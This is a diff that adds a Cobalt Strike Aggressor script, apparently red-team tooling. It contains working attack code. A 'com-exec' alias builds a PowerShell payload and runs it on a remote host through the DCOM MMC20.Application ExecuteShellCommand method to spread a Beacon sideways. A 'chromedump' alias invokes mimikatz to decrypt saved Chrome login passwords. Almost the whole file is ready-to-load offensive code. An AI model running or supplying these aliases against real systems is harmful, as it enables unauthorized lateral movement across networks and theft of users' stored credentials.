@@ -1,0 +1,63 @@
+# Lateral Movement alias
+# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
+
+# register help for our alias
+beacon_command_register("com-exec", "lateral movement with DCOM",
+	"Synopsis: com-exec [target] [listener]\n\n" .
+	"Run a payload on a target via DCOM MMC20.Application Object");
+
+# here's our alias to collect our arguments
+alias com-exec {
+	if ($3 is $null) {
+		# let the user choose a listener
+		openPayloadHelper(lambda({
+			com_exec_go($bid, $target, $1);
+		}, $bid => $1, $target => $2));
+	}
+	else {
+		# we have the needed arguments, pass them
+		com_exec_go($1, $2, $3);
+	}
+}
+
+# this is the implementation of the attack
+sub com_exec_go {
+	local('$command $script $oneliner');
+
+	# check if our listener exists
+	if (listener_info($3) is $null) {
+		berror($1, "Listener $3 does not exist");
+		return;
+	}
+
+	# state what we're doing.
+	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3, $2) . ") via DCOM");
+
+	# generate a PowerShell one-liner to run our alias	
+	$command = powershell($3, true, "x86");
+
+	# remove "powershell.exe " from our command
+	$command = strrep($command, "powershell.exe ", "");
+
+	# build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application object
+	$script  = '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "';
+	$script .= $2;
+	$script .=  '")).Document.ActiveView.ExecuteShellCommand("';
+	$script .= 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe';
+	$script .= '", $null, "';
+	$script .= $command;
+	$script .= '", "7")';
+
+	# run the script we built up
+	bpowershell!($1, $script);
+	
+	# complete staging process (for bind_pipe listeners)
+	bstage($1, $2, $3);
+}
+
+
+# Chrome dump per #armitage IRC:
+#   -`butane
+alias chromedump { 
+	bmimikatz($1, "dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect"); 
+}
